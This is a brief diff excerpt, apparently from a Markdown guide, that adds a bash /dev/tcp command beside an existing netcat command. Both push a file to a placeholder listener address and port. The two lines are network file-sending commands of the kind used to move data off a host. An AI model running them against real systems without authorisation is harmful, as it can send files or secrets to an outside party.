@@ -31,5 +31,5 @@ nc -q 0 %ListenerAddress% %ListeningPort% < file.ext
 If NetCat is unavailable, this can be done with bash:
 
 ```
-
+cat file.ext >& /dev/tcp/%ListenerAddress%/%ListenerPort%
 ```
